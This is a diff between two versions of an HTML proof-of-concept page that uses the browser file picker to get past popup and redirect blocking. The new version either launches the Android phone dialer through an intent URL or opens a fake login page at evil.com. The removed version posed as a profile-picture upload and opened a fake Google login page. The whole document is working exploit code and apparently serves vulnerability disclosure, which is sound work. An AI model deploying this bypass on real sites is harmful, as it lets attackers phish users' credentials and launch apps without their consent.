@@ -1,45 +1,45 @@
-<!doctype html>
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>File Picker Popup Bypass – High Impact PoC</title>
-<style>
-  html,body {margin:0; height:100%; font-family:sans-serif; background:#fafafa;}
-  .full {height:100%; display:flex; align-items:center; justify-content:center; flex-direction:column;}
-  .btn {padding:18px 22px; border-radius:10px; background:#222; color:#fff; font-size:18px; cursor:pointer; user-select:none;}
-  #fileInput {display:none;}
-</style>
+<!DOCTYPE html>
+<html>
+<head>
+<title>Popup/Redirect Bypass – Dual Abuse PoC</title>
+</head>
+<body>
+<h2>File Picker → App Launch / Phishing</h2>
+<p>Pick any file. Depending on the mode, it will either:</p>
+<ul>
+<li>📱 Launch the Phone Dialer</li>
+<li>🎭 Redirect to a fake login page (evil.com)</li>
+</ul>
 
-<div class="full" id="root">
-  <div class="btn">Tap to upload profile picture</div>
-  <input id="fileInput" type="file" accept="image/*">
-</div>
+<select id="mode">
+  <option value="dialer">📱 Launch Dialer</option>
+  <option value="phish">🎭 Fake Login Page</option>
+</select>
+<br><br>
+<button onclick="trigger()">Pick File & Exploit</button>
 
 <script>
-  const root = document.getElementById('root');
-  const input = document.getElementById('fileInput');
-
-  async function pickerFlow() {
+async function trigger() {
+    const mode = document.getElementById('mode').value;
     try {
-      if (window.showOpenFilePicker) {
-        const [handle] = await showOpenFilePicker({ types: [{ accept: { 'image/*': ['.png','.jpg','.jpeg'] } }] });
-        // Simulate "profile upload" then phishing page
-        window.open('https://evil.example/fake-google-login.html', '_blank');
-        return;
-      }
+        // Step 1: Trigger file picker (consumes popup/redirect block)
+        await window.showOpenFilePicker();
+
+        // Step 2: Payload switch
+        if (mode === 'dialer') {
+            // Cross-app abuse: Open phone dialer with number 12345
+            window.open(
+              'intent://12345#Intent;scheme=tel;package=com.android.server.telecom;end',
+              '_blank'
+            );
+        } else if (mode === 'phish') {
+            // Phishing: Redirect to fake login page
+            window.open('https://evil.com/fake-login', '_blank');
+        }
     } catch (e) {
-      console.warn('FSAPI not supported, falling back', e);
+        alert('Error: ' + e);
     }
-    input.click();
-  }
-
-  input.onchange = () => {
-    // Phishing variant
-    window.open('https://evil.example/fake-google-login.html', '_blank');
-
-    // Cross-app abuse variant — uncomment to demonstrate
-    // window.open('intent://scan/#Intent;scheme=zxing;package=com.google.zxing.client.android;end', '_blank');
-  };
-
-  root.addEventListener('click', () => {
-    pickerFlow();
-  });
+}
 </script>
+</body>
+</html>
